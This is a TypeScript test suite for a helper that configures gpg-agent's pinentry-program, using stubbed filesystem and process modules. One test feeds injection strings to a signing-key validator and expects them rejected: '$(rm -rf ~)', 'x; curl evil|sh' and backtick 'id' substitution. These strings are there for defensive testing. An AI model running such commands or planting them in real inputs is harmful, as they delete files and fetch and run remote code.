import { test } from 'node:test'
import assert from 'node:assert/strict'
import { register } from 'node:module'

// ensurePinentry edits ~/.gnupg/gpg-agent.conf and restarts the user's
// gpg-agent, so the loader hands unlock.ts an in-memory filesystem and a
// recording execFile instead. That also makes "is pinentry-curses installed?"
// something the test decides, rather than a property of whoever runs it.
interface FakeFs {
  files: Map<string, string>
  dirs: Set<string>
}
const g = globalThis as typeof globalThis & {
  __floeFs?: FakeFs
  __floeExec?: { cmd: string; args: string[] }[]
}
g.__floeFs = { files: new Map(), dirs: new Set() }
g.__floeExec = []

process.env.HOME = '/floe-test-home'
const CONF = '/floe-test-home/.gnupg/gpg-agent.conf'

const hookSource = `
const FS = [
  'const fs = () => globalThis.__floeFs',
  'export function existsSync(p) { return fs().files.has(String(p)) || fs().dirs.has(String(p)) }',
  'export function readFileSync(p) {',
  '  const body = fs().files.get(String(p))',
  '  if (body === undefined) throw Object.assign(new Error("ENOENT: " + p), { code: "ENOENT" })',
  '  return body',
  '}',
  'export function mkdirSync(p) {',
  '  if (fs().files.has(String(p))) throw new Error("ENOTDIR: not a directory")',
  '  fs().dirs.add(String(p))',
  '}',
  'export function appendFileSync(p, data) {',
  '  fs().files.set(String(p), (fs().files.get(String(p)) ?? "") + data)',
  '}',
  'export default { existsSync, readFileSync, mkdirSync, appendFileSync };'
].join('\\n')
const CHILD = [
  'export function execFile(cmd, args, opts, cb) {',
  '  globalThis.__floeExec.push({ cmd, args })',
  '  const done = typeof opts === "function" ? opts : cb',
  '  if (done) done(null, "", "")',
  '  return { stdin: { end() {} } }',
  '}',
  'export default { execFile };'
].join('\\n')
export async function resolve(specifier, context, next) {
  if (specifier === 'node:fs') return { url: 'stub:fs', shortCircuit: true, format: 'module' }
  if (specifier === 'node:child_process') return { url: 'stub:child', shortCircuit: true, format: 'module' }
  return next(specifier, context)
}
export async function load(url, context, next) {
  if (url === 'stub:fs') return { format: 'module', shortCircuit: true, source: FS }
  if (url === 'stub:child') return { format: 'module', shortCircuit: true, source: CHILD }
  return next(url, context)
}
`
register('data:text/javascript,' + encodeURIComponent(hookSource), import.meta.url)

const { ensurePinentry, hasPinentryProgram, isSafeSigningKey } = await import('./unlock.ts')

function fs(opts: { conf?: string; pinentries?: string[]; confIsDir?: boolean } = {}): FakeFs {
  const state: FakeFs = { files: new Map(), dirs: new Set() }
  if (opts.conf !== undefined) state.files.set(CONF, opts.conf)
  if (opts.confIsDir) state.files.set('/floe-test-home/.gnupg', 'a file where the dir should be')
  for (const p of opts.pinentries ?? []) state.files.set(p, '#!/bin/sh')
  g.__floeFs = state
  g.__floeExec = []
  return state
}

// The whole feature hinges on gpg-agent having a TTY pinentry configured. If this
// detection is wrong we either clobber a user's config (false negative) or leave
// them with a broken headless pinentry (false positive on a commented line).

test('detects an active pinentry-program line', () => {
  assert.equal(hasPinentryProgram('pinentry-program /usr/bin/pinentry-curses\n'), true)
  assert.equal(hasPinentryProgram('default-cache-ttl 28800\n  pinentry-program /x\n'), true)
})

test('a commented-out line does NOT count as configured', () => {
  assert.equal(hasPinentryProgram('# pinentry-program /usr/bin/pinentry-gnome3\n'), false)
  assert.equal(hasPinentryProgram(''), false)
  assert.equal(hasPinentryProgram('default-cache-ttl 28800\n'), false)
})

// user.signingkey comes from a repo's .git/config and is interpolated into an
// `sh -c` string — a hostile clone must not be able to inject shell metacharacters.
test('signingkey accepts real keyids/fingerprints/emails', () => {
  assert.equal(isSafeSigningKey('971CD8002CC5C5A3'), true)
  assert.equal(isSafeSigningKey('rafael@lunardelli.me'), true)
  assert.equal(isSafeSigningKey('B7A1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9'), true)
})

test('signingkey rejects shell metacharacters', () => {
  assert.equal(isSafeSigningKey('$(rm -rf ~)'), false)
  assert.equal(isSafeSigningKey('x; curl evil|sh'), false)
  assert.equal(isSafeSigningKey("x'`id`'"), false)
  assert.equal(isSafeSigningKey(''), false)
})

// A pinentry the user chose is the user's choice — rewriting it would swap a
// working pinentry-mac for curses behind their back.
test('an existing pinentry-program is left exactly as it is', () => {
  const state = fs({ conf: 'pinentry-program /usr/bin/pinentry-gnome3\n', pinentries: ['/usr/bin/pinentry-curses'] })

  assert.deepEqual(ensurePinentry(), { ok: true })
  assert.equal(state.files.get(CONF), 'pinentry-program /usr/bin/pinentry-gnome3\n')
  assert.deepEqual(g.__floeExec, []) // nothing written, so nothing to reload
})

test('no conf at all: the line is written and the agent reloaded', () => {
  const state = fs({ pinentries: ['/usr/bin/pinentry-curses'] })

  const result = ensurePinentry()

  assert.equal(result.ok, true)
  assert.match(result.note ?? '', /pinentry-program \/usr\/bin\/pinentry-curses/)
  assert.equal(state.files.get(CONF), 'pinentry-program /usr/bin/pinentry-curses\n')
  assert.deepEqual(g.__floeExec, [{ cmd: 'gpgconf', args: ['--kill', 'gpg-agent'] }])
})

// Appending to a conf whose last line has no newline would produce
// `default-cache-ttl 28800pinentry-program …` and break both settings.
test('a conf without a trailing newline gets one before the new line', () => {
  const state = fs({ conf: 'default-cache-ttl 28800', pinentries: ['/opt/homebrew/bin/pinentry-mac'] })

  assert.equal(ensurePinentry().ok, true)
  assert.equal(
    state.files.get(CONF),
    'default-cache-ttl 28800\npinentry-program /opt/homebrew/bin/pinentry-mac\n'
  )
})

// curses/tty draw inside the PTY everywhere; pinentry-mac only works where
// there is a GUI, so it is the last resort.
test('curses wins over mac even when mac comes first on disk', () => {
  fs({ pinentries: ['/usr/bin/pinentry-mac', '/opt/homebrew/bin/pinentry-curses'] })

  assert.match(ensurePinentry().note ?? '', /\/opt\/homebrew\/bin\/pinentry-curses/)
})

// The bug this feature fixes: a headless box falling back to a GUI pinentry.
// Saying so beats writing a line that cannot work.
test('no usable pinentry is a clear error, not a silent write', () => {
  const state = fs({ pinentries: ['/usr/bin/pinentry-gnome3'] })

  const result = ensurePinentry()

  assert.equal(result.ok, false)
  assert.match(result.error ?? '', /pinentry-curses/)
  assert.equal(state.files.has(CONF), false)
})

test('a .gnupg that cannot be written reports the path it failed on', () => {
  fs({ confIsDir: true, pinentries: ['/usr/bin/pinentry-curses'] })

  const result = ensurePinentry()

  assert.equal(result.ok, false)
  assert.match(result.error ?? '', /gpg-agent\.conf/)
})
